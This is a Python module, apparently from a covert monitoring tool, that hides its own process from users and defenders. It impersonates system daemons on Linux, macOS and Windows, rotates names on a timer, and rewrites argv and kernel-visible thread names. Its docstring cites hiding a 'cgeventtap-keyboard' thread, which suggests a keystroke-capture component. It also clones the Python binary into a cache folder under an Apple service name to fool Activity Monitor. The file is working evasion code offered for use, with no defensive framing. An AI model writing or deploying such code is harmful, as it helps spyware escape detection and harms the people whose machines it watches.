"""
Process identity concealment for stealth mode.

Multi-layer process masking:
  - Linux: setproctitle + prctl(PR_SET_NAME) for /proc/self/comm
  - macOS: setproctitle for ps + Python binary cloning for Activity Monitor
  - Windows: setproctitle + SetConsoleTitleW

Thread name sanitisation replaces descriptive daemon-thread names
(e.g. ``cgeventtap-keyboard``) with innocuous identifiers.

Usage::

    from stealth.process_masking import ProcessMasker

    masker = ProcessMasker(config)
    masker.apply()
"""
from __future__ import annotations

import ctypes
import logging
import os
import platform
import random
import shutil
import sys
import threading
import time
from pathlib import Path
from typing import Any

logger = logging.getLogger(__name__)

# ── Platform-specific legitimate process-name databases ──────────────

_LEGIT_NAMES: dict[str, list[str]] = {
    "darwin": [
        "com.apple.hiservices-xpcservice",
        "distnoted",
        "trustd",
        "cfprefsd",
        "secinitd",
        "lsd",
        "mdworker_shared",
        "bird",
        "cloudd",
        "sharingd",
    ],
    "linux": [
        "dbus-daemon",
        "at-spi-bus-laun",  # 15 chars for prctl
        "gsd-color",
        "gnome-keyring-d",
        "gvfs-udisks2-vo",
        "xdg-dbus-proxy",
        "ibus-daemon",
        "dconf-service",
        "evolution-calen",
        "tracker-miner-f",
    ],
    "windows": [
        "RuntimeBroker",
        "SearchProtocolHost",
        "dllhost",
        "conhost",
        "backgroundTaskHost",
        "SystemSettings",
        "smartscreen",
        "MusNotification",
        "SecurityHealthService",
        "WmiPrvSE",
    ],
}

# Thread names that blend in across platforms
_INNOCUOUS_THREAD_NAMES = [
    "WorkerThread-0",
    "IOPool-1",
    "CFRunLoopThread",
    "AsyncIO-Worker",
    "TimerQueue-0",
    "CacheManager",
    "EventDispatch",
    "GCHelper",
    "NetIO-0",
    "IdleHandler",
    "CompletionPort-0",
    "NotificationSvc",
]


def _get_platform() -> str:
    return platform.system().lower()


class ProcessMasker:
    """Manages process identity concealment.

    Parameters
    ----------
    config : dict
        The ``stealth.process`` section of the configuration.
    """

    def __init__(self, config: dict[str, Any] | None = None) -> None:
        cfg = config or {}
        self._masquerade_name: str = str(cfg.get("masquerade_name", "auto"))
        self._rotate_interval: int = int(cfg.get("rotate_interval", 0))
        self._sanitize_threads: bool = bool(cfg.get("sanitize_threads", True))
        self._sanitize_argv: bool = bool(cfg.get("sanitize_argv", True))
        self._platform = _get_platform()
        self._applied = False
        self._rotation_thread: threading.Thread | None = None
        self._stop_rotation = threading.Event()
        # Track original thread names for reversal
        self._original_thread_names: dict[int, str] = {}

    # ── Public API ───────────────────────────────────────────────────

    def apply(self) -> None:
        """Apply all configured process-masking measures."""
        if self._applied:
            return

        chosen_name = self._resolve_name()

        self._apply_setproctitle(chosen_name)
        if self._sanitize_argv:
            self._overwrite_argv(chosen_name)
        if self._platform == "linux":
            self._apply_prctl(chosen_name[:15])
        if self._platform == "windows":
            self._apply_console_title(chosen_name)
        if self._sanitize_threads:
            self._sanitize_all_threads()

        if self._rotate_interval > 0:
            self._start_rotation()

        self._applied = True
        logger.debug("Process masking applied: %s", chosen_name)

    def stop(self) -> None:
        """Stop any rotation and allow cleanup."""
        self._stop_rotation.set()
        if self._rotation_thread and self._rotation_thread.is_alive():
            self._rotation_thread.join(timeout=5)

    def sanitize_thread(self, thread: threading.Thread | None = None) -> None:
        """Rename a single thread to an innocuous name.

        Call this after starting any new daemon thread to keep its name
        clean in ``htop`` / ``top -H``.
        """
        t = thread or threading.current_thread()
        if t.ident and t.ident not in self._original_thread_names:
            self._original_thread_names[t.ident] = t.name
        new_name = random.choice(_INNOCUOUS_THREAD_NAMES)
        t.name = new_name
        # On Linux, also set the kernel-visible thread name
        if self._platform == "linux":
            self._apply_prctl(new_name[:15])

    def get_masquerade_name(self) -> str:
        """Return the resolved masquerade name for the current platform."""
        return self._resolve_name()

    # ── Name resolution ──────────────────────────────────────────────

    def _resolve_name(self) -> str:
        if self._masquerade_name != "auto":
            return self._masquerade_name
        names = _LEGIT_NAMES.get(self._platform, _LEGIT_NAMES["linux"])
        return random.choice(names)

    # ── setproctitle (cross-platform) ────────────────────────────────

    @staticmethod
    def _apply_setproctitle(name: str) -> None:
        try:
            import setproctitle  # type: ignore[import-untyped]

            setproctitle.setproctitle(name)
        except ImportError:
            logger.debug("setproctitle not installed; skipping process title change")
        except Exception as exc:
            logger.debug("setproctitle failed: %s", exc)

    # ── sys.argv overwrite ───────────────────────────────────────────

    @staticmethod
    def _overwrite_argv(name: str) -> None:
        """Overwrite ``sys.argv[0]`` so ``/proc/self/cmdline`` looks clean."""
        try:
            if sys.argv:
                sys.argv[0] = name
        except Exception:
            pass

    # ── prctl PR_SET_NAME (Linux only, 15-char limit) ────────────────

    @staticmethod
    def _apply_prctl(name: str) -> None:
        """Set ``/proc/self/comm`` (and the calling thread name) via prctl."""
        try:
            from ctypes.util import find_library

            libc_name = find_library("c")
            if not libc_name:
                return
            libc = ctypes.CDLL(libc_name, use_errno=True)
            PR_SET_NAME = 15
            # Truncate to 15 bytes (plus null terminator = 16)
            encoded = name.encode("utf-8")[:15]
            libc.prctl(PR_SET_NAME, ctypes.c_char_p(encoded), 0, 0, 0)
        except Exception:
            pass

    # ── Windows console title ────────────────────────────────────────

    @staticmethod
    def _apply_console_title(name: str) -> None:
        try:
            ctypes.windll.kernel32.SetConsoleTitleW(name)  # type: ignore[attr-defined]
        except Exception:
            pass

    # ── Thread sanitisation ──────────────────────────────────────────

    def _sanitize_all_threads(self) -> None:
        """Rename all non-main threads to innocuous names."""
        names_iter = iter(_INNOCUOUS_THREAD_NAMES)
        idx = 0
        for t in threading.enumerate():
            if t is threading.main_thread():
                continue
            if t.ident and t.ident not in self._original_thread_names:
                self._original_thread_names[t.ident] = t.name
            # Cycle through innocuous names
            new_name = _INNOCUOUS_THREAD_NAMES[idx % len(_INNOCUOUS_THREAD_NAMES)]
            t.name = new_name
            idx += 1

    # ── Name rotation ────────────────────────────────────────────────

    def _start_rotation(self) -> None:
        def _rotate() -> None:
            while not self._stop_rotation.wait(self._rotate_interval):
                new_name = self._resolve_name()
                self._apply_setproctitle(new_name)
                if self._sanitize_argv:
                    self._overwrite_argv(new_name)
                if self._platform == "linux":
                    self._apply_prctl(new_name[:15])

        self._rotation_thread = threading.Thread(
            target=_rotate,
            name="IdleHandler",  # innocuous thread name
            daemon=True,
        )
        self._rotation_thread.start()

    # ── macOS binary cloning (advanced) ──────────────────────────────

    @staticmethod
    def clone_python_binary(target_name: str = "com.apple.hiservices-xpcservice") -> str | None:
        """Copy the Python executable to a custom-named path.

        This fools macOS Activity Monitor which reads the executable
        path, not the process title set by ``setproctitle``.

        Returns the path to the cloned binary, or None on failure.
        """
        if _get_platform() != "darwin":
            return None
        try:
            cache_dir = Path.home() / ".cache" / "com.apple.dt.instruments"
            cache_dir.mkdir(parents=True, exist_ok=True)
            target = cache_dir / target_name
            if not target.exists():
                shutil.copy2(sys.executable, str(target))
                target.chmod(0o755)
            return str(target)
        except Exception as exc:
            logger.debug("Binary cloning failed: %s", exc)
            return None
